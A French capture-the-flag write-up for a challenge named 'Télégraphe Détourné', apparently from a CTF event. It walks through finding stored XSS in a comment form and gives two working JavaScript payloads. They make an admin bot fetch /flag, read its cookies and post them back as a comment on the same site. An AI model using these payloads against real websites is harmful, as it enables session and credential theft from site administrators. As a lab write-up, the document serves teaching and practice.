# Télégraphe Détourné

# Solution

On arrive sur un site thématique "Télégraphe Baudot" avec :
- Un bouton "Établir le lien" (init CSRF)
- Un encart pour poster des "dépêches" (commentaires)
- Une section "Dépêches reçues" qui affiche les messages
- Un bouton "Signaler un problème" qui fait visiter la page par un admin

## Étape 1 : Trouver la vuln

Premier réflexe, on teste si le HTML est interprété dans les commentaires :

```html
<b>test</b>
```

Et là... "test" s'affiche en **gras**. Pas d'échappement, pas de sanitization. XSS stocké, classique.

## Étape 2 : Comprendre l'environnement

- `/flag` → renvoie 403 pour nous, mais l'admin y a accès
- `/visit` → déclenche la visite du bot admin sur la page
- `/post_comment` → POST un commentaire (champ `comment`)
- `/api/init_csrf` → initialise le token CSRF
- L'admin n'a **pas accès à Internet** → pas d'exfiltration externe, il faut stocker le flag sur le site lui-même

## Étape 3 : Le plan d'attaque

1. Injecter un script XSS dans un commentaire
2. L'admin visite la page → le script s'exécute dans son navigateur
3. Le script fetch `/flag` (l'admin a le droit)
4. Le script poste le résultat comme commentaire via `/post_comment`
5. On recharge la page et on lit le flag

## Étape 4 : Premiers essais, premiers échecs

Premier payload naïf :
```html
<script>
fetch('/flag',{credentials:'include'}).then(r=>r.text()).then(f=>{
  fetch('/post_comment',{
    method:'POST',
    credentials:'include',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'comment='+encodeURIComponent(f)
  });
});
</script>
```

Résultat : le commentaire posté par l'admin dit "Flag transmis..."

Le flag n'est **pas dans le body** de la réponse. Intéressant.

## Étape 5 : Où est le flag alors ?

Si le body dit juste "Flag transmis...", le flag est forcément ailleurs. Headers ? **Cookies !**

## Étape 6 : Le payload final

```html
<script>
fetch('/api/init_csrf',{credentials:'include'}).then(()=>{
  fetch('/flag',{credentials:'include'}).then(r=>{
    if(r.ok){
      var cookies=document.cookie;
      fetch('/post_comment',{
        method:'POST',
        credentials:'include',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body:'comment=COOKIES:'+encodeURIComponent(cookies)
      });
    }
  });
});
</script>
```

On poste, on signale le problème, on attend quelques secondes, on recharge et...

Le flag apparaît dans les dépêches reçues, caché dans les cookies de l'admin ! 🎉

**j'ai oublié de noter le flag ;(**

## Leçon

Jean Baudot n'échappe pas les entrées utilisateur → XSS stocké. Le `/flag` set un cookie contenant le flag quand un admin y accède. Classique combo **Stored XSS + Cookie Stealing** sans exfiltration externe (le site lui-même sert de canal de retour).

Comme dirait l'énoncé : documente-toi sur les technos que tu implémentes, Jean.
